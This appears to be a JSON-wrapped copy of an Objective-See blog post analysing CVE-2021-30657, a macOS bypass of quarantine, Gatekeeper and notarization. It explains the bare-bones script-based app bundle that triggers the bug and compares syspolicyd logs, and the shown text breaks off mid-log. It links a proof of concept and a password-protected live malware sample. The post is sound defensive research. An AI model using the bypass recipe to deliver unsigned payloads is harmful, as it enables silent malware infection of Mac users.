{
    "id": "a2bc606d-308b-464f-835a-5b9d7273d80b",
    "created_at": "2023-01-12T14:58:57.443624Z",
    "updated_at": "2025-03-27T02:16:25.840864Z",
    "deleted_at": null,
    "sha1_hash": "5ff99701eb910b5d2f297be1a6019842c7dfd7b8",
    "title": "2021-04-26 - All Your Macs Are Belong To Us- bypassing macOS's file quarantine, gatekeeper, and notarization requirements",
    "authors": "",
    "file_creation_date": "2022-05-29T01:24:02Z",
    "file_modification_date": "2022-05-29T01:24:02Z",
    "file_size": 2423470,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x64.html**\n\nAll Your Macs Are Belong To Us\n\nbypassing macOS's file quarantine, gatekeeper, and notarization requirements\n\nby: Patrick Wardle / April 26, 2021\n\nüëæ Want to play along?\n\n[I‚Äôve uploaded a sample Proof of Concept ‚Ä¶when run, it simply pops Calculator.app.](https://objective-see.com/downloads/blog/blog_0x64/PoC.zip)\n\n‚ö† Malware\n[I‚Äôve also uploaded a malware sample (Shlayer.zip) that exploited this vulnerability in the wild as a 0day!](https://objective-see.com/downloads/blog/blog_0x64/Shlayer.zip)\n(password: infect3d)\n\n## üñ® Printable\n\nA printable (PDF) version of this blog post, can be downloaded here:\n\n[\"All_Your_Macs_Are_Belong_To_Us.pdf\".](https://objective-see.com/downloads/blog/blog_0x64/All_Your_Macs_Are_Belong_To_Us.pdf)\n\n## Outline\n\nThis is our 100th blog post ‚Ä¶and it‚Äôs a doozy!\n\nBut first, go update your macOS systems to 11.3, as it contains a patch for a massive bug that affects all\nrecent versions of macOS‚Ä¶a bug that is the topic of this blog post.\n\nThis bug trivially bypasses many core Apple security mechanisms, leaving Mac users at grave risk:\n\nopened ‚Üí owned\n‚Ä¶and especially worrisome, turns out malware authors are already exploiting it in the wild as an 0day.\nYikes!\n\nApple patched the bug as CVE-2021-30657, noting \"a malicious application may bypass Gatekeeper\nchecks\"\n[The security researcher Cedric Owens uncovered the flaw and initially reported the bug to Cupertino. Epic](https://twitter.com/cedowens)\nfind Cedric! ü§©\n\n[Cedric notes the bug manifested while building red team payloads via the appify developer tool. He‚Äôs](https://gist.github.com/mathiasbynens/674099)\nposted a must read, that provides step by step details on how this bug may be practically leveraged to\nsurreptitiously deliver payloads in red team exercises:\n\n[\"macOS Gatekeeper Bypass (2021) Addition\".](https://cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508)\n\n\n-----\n\nHowever, as the underlying cause of the bug remained unknown, our blog post focuses on uncovering the\nreason ‚Ä¶ultimately discovering a flaw that lay deep within macOS‚Äôs policy subsystem(s).\n\nThere‚Äôs a rather massive amount of information presented in this blog post, so let‚Äôs break down what\nwe‚Äôre going to cover:\n\nBackground:\nWe begin the post with a discussion of common (user-assisted) infection vectors and highlight\nsecurity mechanisms that Apple has introduced to keep users safe. It is important to understand\nthese core macOS security mechanisms, as they are the very mechanisms the bug trivially and\nwholly bypasses.\n\nRoot Cause Analysis:\nThe core of the blog post digs deep into the bowels of macOS to uncover the root cause of the bug.\nIn this section, we'll detail the flaw which ultimately results in the misclassification of quarantined\nitems, such as malicious applications. Such misclassified apps, even if unsigned (and unnotarized),\nwill be allowed to run uninhibited. No alerts, no prompts, and not blocked. Oops!\n\nIn the Wild (0day):\nUnfortunately a subversive malware installer is already exploiting this flaw in the wild, as a 0day. In\nthis section of the post, we briefly discuss this worrisome finding.\n\nThe Patch:\nNext, after reverse-engineering Apple's 11.3 update, we describe how Cupertino addressed this flaw.\nAnd good news, once patched macOS users should regain full protection.\n\nProtections & Detections:\nFinally, we'll wrap things up with a brief discussion on protections, most notably highlighting the fact\nthat [BlockBlock already provided sufficient protection against this 0day. Here, we'll also discuss a](https://www.objective-see.com/products/blockblock.html)\nnovel idea aimed at detecting previous attacks that exploited this flaw, and provide a simple Python\nscript, [scan.py, to automate such detection!](https://objective-see.com/downloads/blog/blog_0x64/scan.py)\n\n## Background\n\nThe majority of Mac malware infections are a result of users (naively, or mistakenly) running something\nthey should not. And while such infections, yes, do require user interaction, they are still massively\nsuccessful. In fact, the recently discovered `Silver Sparrow malware, successfully infected over 30,000`\nMacs in a matter of weeks, even though such infections did require such user interactions. (See:\n[‚ÄúMysterious Silver Sparrow Malware Found Nesting on 30K Macs‚Äù).](https://threatpost.com/silver-sparrow-malware-30k-macs/164121/)\n\nAnd how do malware authors convince such users to infect themselves? Ah, in a myriad of creative, wily,\nand surreptitious ways such as:\n\nPackaged with shareware:\n\nExample(s): `OSX.InstallCore, and countless other adware.`\n\nMalicious search results:\n\nExample(s): `OSX.Shlayer,` `OSX.SilverSparrow, etc.`\n\n\n-----\n\nPirated/cracked applications\nExample(s): `OSX.iWorm,` `OSX.BirdMiner, etc.`\n\nFake (Flash) Updaters / Applications\nExample(s): `OSX.Shlayer,` `OSX.Siggen, etc.`\n\nMalicious email attachments\nExample(s): `OSX.LaoShu,` `OSX.Janicab, etc.`\n\nSupply chain payloads\nExample(s): `OSX.Proton,` `OSX.KeRanger, etc.`\n\nAnd many many more!\n\nYes, when the user falls for some of these infection vectors (e.g. pirated applications) we collectively\nshake our heads and wonder ‚Äúwell, what did you expect!?‚Äù, however other infection vectors are far more\nsurreptitious and arguably the user is not at fault in any way. For example, in a supply chain attack, where\na legitimate software distribution website is hacked and legitimate products are trojanized, it‚Äôs\nunreasonable to blame any user who inadvertently downloads and runs such software.\n\nRegardless of who‚Äôs at fault (or not), Apple seems to feel personally attacked. Besides of course wanting\nwhat‚Äôs best for their shareholders users, they have an image to uphold! Remember, ‚ÄúMacs Don‚Äôt Get\n_Malware!‚Äù (tm)._\n\nAll kidding (and criticisms) aside, over the years Apple has taken several important steps aimed at\npreventing any and all ‚Äúuser-assisted‚Äù infections. Here, we briefly recap such major steps that include the\naddition of OS-level security mechanisms such as File Quarantine, Gatekeeper, and Application\nNotarization. An understanding of these foundation macOS protection mechanism is important as many\nusers, and even some enterprises have come to (solely) depend on them. Which is fine(ish), unless Apple\nships buggy code that undermines all such protections!\n\n**File Quarantine**\n\nFile Quarantine, was introduced in OSX Leopard (10.5), all the way back in 2007! When a user first opens\na downloaded file such as an application, File Quarantine provides a warning to the user that requires\nexplicit confirmation before allowing the file to execute. The idea is simply to ensure that the user\nunderstands that they are indeed opening an application (even if the file looks like, say, a PDF document).\n\nFor an example of File Quarantine in action let‚Äôs look at the `OSX.LaoShu malware. In order to`\nsurreptitiously trick users into infecting themselves, attackers sent targeted victims customized emails with\na link to a malicious URL. If the user clicked on the link, a malicious application (masquerading as a PDF\ndocument) would be automatically downloaded:\n\nA malicious app (OSX.LaoShu), masquerading as a PDF (image credit: Sophos).\nIf the user would attempt to open what they (understandably) believed was a PDF document, File\nQuarantine would spring into action, alerting the user that this was in fact an application, not a harmless\nPDF document:\n\nFile Quarantine in action (image credit: Sophos).\n\n\n-----\n\nIdeally the user would recognize their (near) faux pas and the infection would be thwarted thanks to File\nQuarantine! It should be noted that even today, a File Quarantine prompt is shown for approved (i.e.\nnotarized) applications.\n\n**Gatekeeper**\n\nUnfortunately users kept infecting themselves, often by ignoring or simply clicking through File Quarantine\nalerts. To combat this, as well as evolving malware infection vectors, Apple introduced Gatekeeper in OSX\nLion (10.7). Built atop File Quarantine, Gatekeeper checks the code signing information of downloaded\nitems and blocks those that do not adhere to system policies. (For example, it checks that items are\nsigned with a valid developer ID):\n\nA Gatekeeper overview\nApple‚Äôs logic was rooted in the (mis)belief that malware authors would not be able to obtain such Apple\nDeveloper IDs, and thus their malware would remain unsigned and thus generically blocked by\nGatekeeper. In the image above, note that when unsigned malware is executed, Gatekeeper will block it\nand alert the user. Moreover, there is no option in the Gatekeeper prompt to allow the (unsigned) code to\nrun. Thus the user is protected. Hooray?\n\nOf course it turned to be fairly trivial for attackers to obtain Apple Developer IDs and thus sign their\nmalicious creations. For example in a supply chain attack against the popular `MacUpdate.com website,`\nattackers trojanized and (re)signed popular software such as Firefox:\n\nTrojanized Firefox (note: \"Developer ID Application: Ramos Jaxson\")\nIf users downloaded and ran the trojanized Firefox, Gatekeeper would allow it ‚Ä¶as it was ‚Äúvalidly‚Äù\n(re)signed. Thus the system would be infected.\n\nUnfortunately even today, it‚Äôs still trivial for attackers to obtain such Apple Developer IDs and thus sign\ntheir malicious creations:\n\nI noticed dozen websites flourishing (even through google ads) for buying/selling/renting Apple\ndeveloper entreprise accounts and Apple developer certificates.\n\nI guess the macOS malware season has started üòÇüåªüåº [pic.twitter.com/PQnrUKQhUF](https://t.co/PQnrUKQhUF)\n\n[‚Äî taha (@lordx64) April 3, 2021](https://twitter.com/lordx64/status/1378254774173372417?ref_src=twsrc%5Etfw)\n\nIt should be noted that even if Gatekeeper is bypassed a File Quarantine prompt would still be shown to\nthe user. Recall that such a prompt requires explicit user-approval. Still, as Gatekeeper failed to be a\npanacea, Apple had to respond ‚Ä¶yet again.\n\n**Notarization Requirements**\n\nMost recently, macOS Catalina (10.15) took yet another step at combating user-assisted infections with\nthe introduction of Application Notarization requirements. These requirements ensure that Apple has\nscanned and approved all software before it is allowed to run, giving users, (as noted by Apple),\n‚Äúconfidence‚Äù that the software, ‚Äúhas been checked for malicious components‚Äù:\n\n\n-----\n\nA notarization overview\n\nNote that similar to a Gatekeeper alert, in a Notarization alert there is no option for the user to allow the\nunnotarized code to run. Thus code that has not been scanned and notarized by Apple will be blocked.\n\nNotarization is clearly the most draconian, yet arguably ‚Äúbest‚Äù approach yet to protect macOS users from\ninadvertently infecting themselves. ‚Ä¶and rather humorously has resulted in hackers sliding into my DMs,\nas notarization apparently ruined their whole operation. Ha!\n\n\n-----\n\nNotarization vs. Hackers\n\n**Quarantine Attribute**\n\nBefore we detail a logic flaw in macOS that allows an attacker to trivially and reliably bypass all of these\nfoundational mitigations, let‚Äôs briefly talk about the quarantine attribute. You may have been wondering,\nhow does macOS know to analyze a file in order to possibly display a File Quarantine, Gatekeeper, or\nNotarization prompt? The answer is the quarantine attribute!\n\nSimply put, whenever an item is downloaded from the Internet (via an application such as a browser),\nmacOS or the application that downloaded the item, will tag it with an extended attribute, named\n```\ncom.apple.quarantine . You can confirm this for yourself. First download any file via your browser and\n\n```\nthen run macOS‚Äôs ‚Äúextended attribute‚Äù utility, `xattr along with the path to file:`\n\n\n-----\n\n```\n  att / o oads/ oc oc \\ sta e app\ncom.apple.quarantine\n% xattr -p com.apple.quarantine ~/Downloads/BlockBlock\\ Installer.app\n0081;606ec805;Chrome;BCCEDD88-5E0C-4F6A-95B7-DBC0D2D645EC\n\n```\nNote that the `-p option will print out the contents of the specified extended attribute. For the`\n```\ncom.apple.quarantine this includes various flags, a time stamp, the responsible application that\n\n```\ndownloaded the file, and a UUID that maps to a key in the\n```\ncom.apple.LaunchServices.QuarantineEventsV* database.\n\n```\nWhenever the user first attempts to open a file that contains a quarantine attribute (i.e. anything\ndownloaded from the Internet), macOS will launch the process in a suspended state. Then, the system will\nperform a myriad of complex checks on the file, designed to trigger the appropriate alert or prompt. On\nmodern versions of macOS the user will either be shown:\n\n1. A (File Quarantine) prompt requiring explicit user consent (if the item is validly signed and\n\nnotarized).\n\n‚Ä¶or\n2. A (Notarization) alert informing the user that the file cannot be run (if the item is not validly signed\n\nand notarized).\n\nIf the process is allowed (signed & notarized) and the user approves it, the system will then unsuspend\n(resume) it ‚Ä¶allowing it to now execute.\n\nIf a file does not contain the com.apple.quarantine attribute, macOS assumes it's a local file. As such,\nnone of the checks will be performed and thus no prompts/alerts will be shown. This is by design, and is\nnot a bug.\nWhile this means malware that is already on the box can download unsigned/unnotarized (second-stage)\npayloads, strip the quarantine attribute, then launch said payloads without fear of alerts ‚Ä¶the fact remains\nthe initial malware (or its delivery mechanism) will possess the quarantine attribute, and thus will be\nsubjected to such checks and/or alerts when launched.\n\nBut what if I told you there was a trivial and reliable way to bypass any and all such prompts!? ‚Ä¶meaning,\nif a user simply double-clicks on the file, game freaking over!? ÔøΩ\n\n## Problem(s) In Paradise\n\nSince 2007 (when File Quarantine was introduced) macOS has alerted users whenever they attempt to\nlaunch an application that has been downloaded from the Internet. And now, on recent versions of\nmacOS, unless that application has been scanned and explicitly approved (notarized) by Apple, macOS\nwill refuse to run the file ‚Ä¶or will it!?\n\nUnfortunately as we‚Äôll see, due to a subtle logic bug deep within Apple‚Äôs policy engine, it was possible to\ncraft a malicious application that though unsigned (and hence unnotarized), would be allowed to launch\nwith no prompts nor alerts. No File Quarantine prompt, no Gatekeeper alert, no Notarization alert ‚Ä¶\nnothing!\n\nIn the following demo, a proof of concept application named ‚ÄúPatricks_Resume‚Äù is downloaded. Though it\nappears to be a harmless PDF document, when opened, though unsigned, unnotarized, and quarantined,\nit‚Äôs able to launch Calculator.app (or really do pretty much anything else):\n\n\n-----\n\nNote that the exploited system is a fully patched M1 Macbook, running the latest macOS Big Sur (11.2.3).\n\nWe can confirm the downloaded app has been tagged with the quarantine attribute:\n```\n% xattr ~/Downloads/Patricks_Resume.app\ncom.apple.FinderInfo\ncom.apple.metadata:kMDItemWhereFroms\ncom.apple.quarantine\n\n```\n‚Ä¶and is completely unsigned (and thus unnotarized):\n\nUnsigned, unnotarized,\n\nand quarantined\nI guess, party like it‚Äôs pre-2007!? üò±\n\n\n-----\n\nIt appears that this bug was introduced in macOS 10.15 ...thus older versions of macOS do not seem be\nvulnerable.\nIf I had to guess, it was likely introduced along with macOS 10.15‚Äôs new notarization logic. Thus the goal\nof attempting to secure and lock down macOS wholly backfired:\n\n...meanwhile, at Cupertino? (image credit: @urupzia)\n\n## Root Cause Analysis\n\nObviously this vulnerability is massively bad, as it affords malware authors the ability to return to their\nproven methods of targeting and infecting macOS users. Though we‚Äôll talk about 3rd-party methods of\nprotections (that existed before Apple‚Äôs patch!) as well as methods of detections exploitation attempts of\nthis bug, first let‚Äôs walk through the process of uncovering the root cause, the underlying flaw.\n\nOur analysis was performed on a fully patched macOS Big Sur (11.2.3) system. Due to \"security\" features\non M1 systems (that hinder debugging), we'll stick to a Intel/x86_64 system.\nHowever as the flaw is a logic issue, the systems underlying architecture is irrelevant (as illustrated in the\nexploitation of a M1 system in the video above).\n\nThough the underlying flaw is found deep in the bowels of macOS, don‚Äôt worry we‚Äôll gently ease in.\n\nFirst, take a look at the our proof of concept application ( PoC.app ) that triggers the vulnerability (as this\nwill be launched with no alerts nor prompts, even though it‚Äôs unsigned, unnotarized, and quarantined).\n\nOur proof of concept application\n\nAt first glance, it appears to be a standard macOS application.\n\nHowever, if we dig deeper, we note two important observations:\n\n\n-----\n\n1. The application s bundle is missing several standard components, most notably there is no\n```\n   Info.plist file. (An Info.plist file contains meta information about an application, such as\n\n```\nthe path to its executable).\n```\n   $ find PoC.app\n   PoC.app/Contents\n   PoC.app/Contents/MacOS\n   PoC.app/Contents/MacOS/PoC\n\n```\nInstead, the application is solely composed of a directory named `PoC.app, a` `Contents`\nsubdirectory, a `MacOS sub-subdirectory, and then within that, a file whose name matches that of`\nthe (top-level) application ( PoC ).\n2. The application‚Äôs executable component ( PoC ) is not a mach-O binary, but rather a (bash) script:\n```\n   $ file PoC.app/Contents/MacOS/PoC \n   PoC.app/Contents/MacOS/PoC: POSIX shell script text executable, ASCII text\n\n```\nIn terms of the first observation, it turns out that many of the standard components of an application‚Äôs\nbundle (e.g. the `Info.plist file) are indeed optional. In fact, it appears that the system treats anything`\nthat ends in `.app as an application. To test this, simply create an empty folder name` `foo.app and`\ndouble-click it. Though it errors out (as it‚Äôs just a folder, with no executable content), the error prompt\nconfirms that the system did indeed try to launch it as an application:\n\n...tried (and failed) to launch as an app\nTurns out, if we add a `Contents folder, then (within that) a` `MacOS folder, and finally (within that) an`\nexecutable item ‚Ä¶it will successfully run! Though rather bare-boned, that‚Äôs apparently all that‚Äôs needed.\nIt‚Äôs worth reiterating that without an `Info.plist file, the executable item‚Äôs name, must match the name`\nof the application. This is how macOS is still able to ascertain what to execute when the user double clicks\nthe ‚Äúapp‚Äù. Hence, for our bare-bones proof of concept application ( PoC.app ), the item‚Äôs name must be\n```\nPoC :\n\n```\nOur bare-boned PoC app's bundle structure\n[The \"appify\" developer script on github, will programmatically create such a bare-bones application for you](https://gist.github.com/mathiasbynens/674099)\n(that unintentionally, will trigger this vulnerability).\nBefore moving on, let‚Äôs ratchet up macOS application policy to its highest and most restrictive level, so\nthat only applications from the macOS app store are allowed. In theory this means that external\napplications, even if notarized will be blocked by the OS:\n\nApplication policy\nIt‚Äôs important though to note that the vulnerability also presents itself at lower / the default policy settings.\nThat is to say, it is unrelated and unaffected by the system policy settings.\n\nLet‚Äôs now upload this ‚Äúbare-bones‚Äù application, and then download it to simulate an attack. Once\ndownloaded, we can confirm that, as expected, the application has been automatically tagged with the\n```\ncom.apple.quarantine extended attribute:\n$ xattr ~/Downloads/PoC.app \n...\ncom.apple.quarantine\n$ xattr -p com.apple.quarantine ~/Downloads/PoC.app \n0081;606fefb9;Chrome;688DEB5F-E0DF-4681-B747-1EC74C61E8B6\n\n```\n\n-----\n\nThus we can assume (and later confirm) that the bug is not related to a missing (or say corrupted)\n```\ncom.apple.quarantine attribute. And due to the presence of this quarantine attribute, we‚Äôll see it will\n\n```\n_still be evaluated by macOS‚Äôs ‚Äúshould-this-application-be-allowed-to-run‚Äù logic._\n\n[We can also confirm (via a tools such as WhatsYourSign), that the application is unsigned (and thus also](https://objective-see.com/products/whatsyoursign.html)\nunnotarized):\n\nPoC.app: unsigned/unnotarized\nDue to the fact that the application has been tagged with a quarantine attribute, and that it is unsigned\n(and thus not notarized), one would certainly think it would be soundly blocked by macOS. But as we\nnoted early this is not the case ‚Ä¶it‚Äôs allowed to run uninhibited.\n\nAs the quarantined application is allowed (with no alerts nor prompts), this implies a bug is somewhere in\nmacOS‚Äôs application ‚Äúevaluation‚Äù logic. Unfortunately (for us), when a user launches an application no\nless than half a dozen user-mode applications, system daemons and the kernel are involved.\n\n[In a 2016 talk at ShmooCon titled, ‚ÄúGatekeeper Exposed; Come, See, Conquer‚Äù, I provided a detailed](https://files.speakerdeck.com/presentations/9e724ea233434f9fb083bff26bc7fb4b/ShmooCon_2016.pdf)\n(although now somewhat dated) walk-through of these interactions:\n\n\n-----\n\n-----\n\nLaunching an application is a complicated ordeal\nSince this talk, Apple has expanded (read: complicated) this process, adding XPC calls into its system\npolicy daemon, `syspolicyd, and its XProtect (anti-virus) agent,` `XprotectService .`\n\nInstead of painstakingly walking through every single one of these interprocess and kernel interactions,\nlet‚Äôs see if we can first zero in on the likely location of the bug via a more passive approach ‚Ä¶log\nmessages!\n\n## Root Cause Analysis: To The Logs!\n\nRecall that our problematic proof of concept application is a rather abnormal ‚Äúbare-bones‚Äù application\nwhose executable component is a script (versus a normal mach-O binary).\n\nOur idea to get a better sense of where the bug may lie is rather simple. While monitoring system logs\nlet‚Äôs run:\n\nA ‚Äúnormal‚Äù application\n\n‚Ä¶containing the standard application bundle files (such as an `Info.plist file), as well as`\nstandard mach-O executable.\n\nA script-based application ( Script.app )\n\n‚Ä¶containing the standard application bundle files (such as an `Info.plist file), but a (bash) script`\nas its executable.\n\nOur proof-of-concept application ( PoC.app )\n\n‚Ä¶missing the standard application bundle files (such as an `Info.plist file), and having a (bash)`\nscript as its executable.\n\nAll three are unsigned and downloaded from the Internet (i.e. tagged with the `com.apple.quarantine`\nextended attribute). As the ‚Äúnormal‚Äù and script-based application are both blocked (as expected) ideally\nwe‚Äôll quickly uncover any divergent logic which can point us decisively in the direction of a bug which\nallows our PoC to run!\n\nOn recent versions of macOS, Apple has unified all logging and provided a new utility (aptly named) `log`\nto parse and view all log messages. If executed with the `stream parameter, the` `log utility will stream`\nmessages to a terminal window as they‚Äôre generated.\n\nUnfortunately for security and privacy reasons much of the (likely relevant) output is redacted. (You‚Äôve\nlikely seen the `<private> keyword, indicating some/all of the message has been redacted). However by`\ninstalling a customized profile we can disable such redactions and thus fully view any and all log\nmessages.\n\n\n-----\n\n```\n   OC p st U C // pp e Co pute // S 0//\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n 2<plist version=\"1.0\">\n 3<dict>\n 4 <key>PayloadContent</key>\n 5 <array>\n 6  <dict>\n 7   <key>PayloadDisplayName</key>\n 8   <string>Private Data Logging</string>\n 9   <key>PayloadIdentifier</key>\n10   <string>com.apple.private-data.logging</string>\n11   <key>PayloadType</key>\n12   <string>com.apple.system.logging</string>\n13   <key>PayloadUUID</key>\n14   <string>686285D4-CCD8-4A12-B861-080E1754E835</string>\n15   <key>PayloadVersion</key>\n16   <integer>1</integer>\n17   <key>System</key>\n18   <dict>\n19    <key>Enable-Private-Data</key>\n20    <true/>\n21        <key>Privacy-Enable-Level</key>\n22        <string>Sensitive</string>\n23        <key>Default-Privacy-Setting</key>\n24        <string>Sensitive</string>\n25   </dict>\n26  </dict>\n27 </array>\n28 <key>PayloadDisplayName</key>\n29 <string>Private Data Logging</string>\n30 <key>PayloadIdentifier</key>\n31 <string>LoggingProfile</string>\n32 <key>PayloadRemovalDisallowed</key>\n33 <false/>\n34 <key>PayloadType</key>\n35 <string>Configuration</string>\n36 <key>PayloadUUID</key>\n37 <string>D2943CD1-75E8-4024-8525-79DF78377418</string>\n38 <key>PayloadVersion</key>\n39 <integer>1</integer>\n40</dict>\n41</plist>\n\n```\nA \"private data logging\" profile\n\nFor more information on the process of enabling read access to private log data, see:\n\n[Unified Logs: How to Enable Private Data.](https://www.cmdsec.com/unified-logs-enable-private-data/)\nIf your idea of fun is reading lines and lines and lines of largely irrelevant log messages, I‚Äôm sorry (for\nseveral reasons). Here, I‚Äôm only going to present a few relevant lines from executing first the ‚Äúnormal‚Äù\nmach-O application, then the ‚Äúnormal‚Äù script-based application, and finally our problematic proof of\nconcept application. Again the goal is to identify both commonalities, and divergences in logging output\namongst the three, with the hope of finding the general location of the bug. Recall also that all three\napplications are unsigned and downloaded from the Internet (and thus have been tagged with the file\nquarantine extended attribute).\n\n[First up, let‚Äôs attempt to launch the ‚Äúnormal‚Äù mach-O application. I chose the MachOView utility, grabbed](https://sourceforge.net/projects/machoview/)\noff SourceForge. As we‚Äôve set macOS‚Äôs application policy to its highest setting (only applications from the\nApp Store) when we run it, it is, as expected blocked:\n\n\n-----\n\nThe normal (mach-O) app: blocked\nNote that if we lower the policy to allow applications from either the macOS App Store or from ‚Äúidentified\ndevelopers‚Äù it is still blocked as it is not notarized:\n\nThe normal (mach-O) app: still blocked\nEither way, note that neither prompt provides a way to allow the application to run.\n\nNow to the logs!\n```\n% log stream --level debug\n...\nsyspolicyd: [com.apple.syspolicy.exec:default] GK process assessment: /Volumes/MachOView\n1/MachOView.app/Contents/MacOS/MachOView syspolicyd: [com.apple.syspolicy.exec:default] GK\nperformScan: PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)),\n(bundle_id: (null))\nsyspolicyd: [com.apple.syspolicy.exec:default] Checking legacy notarization\nsyspolicyd: (Security) [com.apple.securityd:notarization] checking with online notarization\nservice for hash ...\nsyspolicyd: (Security) [com.apple.securityd:notarization] isNotarized = 0\nsyspolicyd: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path: /Volumes/MachOView\n1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0\nsyspolicyd: [com.apple.syspolicy.exec:default] App gets first launch prompt because\nresponsibility: /Volumes/MachOView 1/MachOView.app/Contents/MacOS/MachOView, /Volumes/MachOView\n1/MachOView.app\nsyspolicyd: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 0, PST: (path:\n/Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: MachOView), 1, 0,\n1, 0, 7, 0\nsyspolicyd: [com.apple.syspolicy.exec:default] GK eval - was allowed: 0, show prompt: 1\nsyspolicyd: (LaunchServices) [com.apple.launchservices:code-evaluation] present prompt: uid=501,\nconn=yes, type=NotAppStore, op.ident=549A641B-A106-4106-AEE7-42468AB103D6, info.ident=050770F187C7-4DD6-962B-3F5280789E3A, info={path=/Volumes/MachOView 1/MachOView.app team=(null) uid=501\nbundle=/Volumes/MachOView 1/MachOView.app}\nsyspolicyd: [com.apple.syspolicy.exec:default] Prompt shown (7, 0), waiting for response: PST:\n(path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: MachOView)\n\n```\nExamining log messages that are generated as a result of attempting to launch the standard mach-O\napplication reveal that Apple‚Äôs system policy daemon, `syspolicyd is ultimately responsible for`\ndetermining if the application is to be allowed ‚Ä¶or denied.\n\nThe messages from `syspolicyd show a Gatekeeper ( GK ) scan is performed on the application, as`\nwell as a notarization check (which returns false). The scan results are shown in the following message:\n‚Äú GK evaluateScanResult: 0, PST: (path: /Volumes/MachOView 1/MachOView.app), (team:\n```\n(null)), (id: (null)), (bundle_id: MachOView), 1, 0, 1, 0, 7, 0 ‚Äù.\n\n```\n‚Ä¶we‚Äôll decode the meaning of these numbers shortly via reverse engineering.\n\nIn the next line of log output, we see a `show prompt: 1 (true). No surprise then, that a prompt (alert) is`\nshown to the user, describing why the application is to be blocked. Once the user interacts with the\nprompt, the following log messages are generated, which confirm that the system (as expected) then\nblocks the application:\n\n\n-----\n\n```\n  og st ea e e debug\n...\nsyspolicyd (LaunchServices) [com.apple.launchservices:code-evaluation] handle prompt\nresponse=Acknowledge, op.ident=549A641B-A106-4106-AEE7-42468AB103D6, info.ident=050770F1-87C74DD6-962B-3F5280789E3A, info={path=/Volumes/MachOView 1/MachOView.app team=(null) uid=501\nbundle=/Volumes/MachOView 1/MachOView.app}\nsyspolicyd [com.apple.syspolicy.exec:default] Terminating process due to Gatekeeper rejection:\n20588, /Volumes/MachOView 1/MachOView.app/Contents/MacOS/MachOView\n\n```\nMoving on, let‚Äôs reset the logs, and execute the second application ‚Ä¶the normal, albeit script-based app\n( Script.app ):\n```\n% log stream --level debug\n...\nsyspolicyd [com.apple.syspolicy.exec:default] Script evaluation:\n/Users/patrick/Downloads/Script.app/Contents/MacOS/Script, /bin/sh\nsyspolicyd [com.apple.syspolicy.exec:default] GK process assessment:\n/Users/patrick/Downloads/Script.app/Contents/MacOS/Script syspolicyd\n[com.apple.syspolicy.exec:default] GK performScan: PST: (path:\n/Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: (null))\nsyspolicyd: [com.apple.syspolicy.exec:default] Checking legacy notarization\nsyspolicyd: (Security) [com.apple.securityd:notarization] checking with online notarization\nservice for hash ...\nsyspolicyd: (Security) [com.apple.securityd:notarization] isNotarized = 0\nsyspolicyd: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path:\n/Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0\nsyspolicyd: [com.apple.syspolicy.exec:default] App gets first launch prompt because\nresponsibility: /bin/sh, /Users/patrick/Downloads/Script.app\nsyspolicyd: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 0, PST: (path:\n/Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script), 1, 0, 1,\n0, 7, 0\nsyspolicyd: [com.apple.syspolicy.exec:default] GK eval - was allowed: 0, show prompt: 1\nsyspolicyd: (LaunchServices) [com.apple.launchservices:code-evaluation] present prompt: uid=501,\nconn=yes, type=NotAppStore, op.ident=21E84192-6289-4C1D-812B-F4027634D2B6, info.ident=563BA5D40EC1-4A06-AC40-7565352A71BD, info={path=/Users/patrick/Downloads/Script.app team=(null) uid=501\nbundle=/Users/patrick/Downloads/Script.app}\nsyspolicyd: [com.apple.syspolicy.exec:default] Prompt shown (7, 0), waiting for response: PST:\n(path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script)\n\n```\nFirst note one difference ‚Ä¶the ‚Äú Script evaluation: ‚Äù log message, that indicates that there is a\n(slightly?) different code path for applications whose executable component is a script.\n\nOther than that, the log messages are nearly identical to the the ‚Äúnormal‚Äù (machO-based) application: a\nGatekeeper scan is performed that results in the same evaluation results: ‚Äú GK evaluateScanResult: 0,\n```\nPST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)),\n(bundle_id: Script), 1, 0, 1, 0, 7, 0 ‚Äù.\n\n```\n\n-----\n\nSuch an evaluation triggers other log messages, and of course a prompt that is shown to the user:\n\nThe normal (script-based) app: blocked\nOnce the user clicks OK, `syspolicyd logs message related to blocking and terminating the application`\n(e.g. ‚Äú Terminating process due to Gatekeeper... ‚Äù).\n\nNow on to running our proof-of-concept application ( PoC.app ), which recall is allowed to run with no\nalerts nor prompts. Here are the relevant log messages from `syspolicyd :`\n```\n% log stream --level debug\n...\nsyspolicyd: [com.apple.syspolicy.exec:default] Script evaluation:\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, /bin/sh\nsyspolicyd: [com.apple.syspolicy.exec:default] GK process assessment:\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC syspolicyd:\n[com.apple.syspolicy.exec:default] GK performScan: PST: (path:\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id:\n(null))\nsyspolicyd: [com.apple.syspolicy.exec:default] Checking legacy notarization\nsyspolicyd: (Security) [com.apple.securityd:notarization] checking with online notarization\nservice for hash ...\nsyspolicyd: (Security) [com.apple.securityd:notarization] isNotarized = 0\nsyspolicyd: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path:\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id:\n(null)), 7, 0\nsyspolicyd: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 2, PST: (path:\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id:\nNOT_A_BUNDLE), 1, 0, 1, 0, 7, 0\nsyspolicyd: 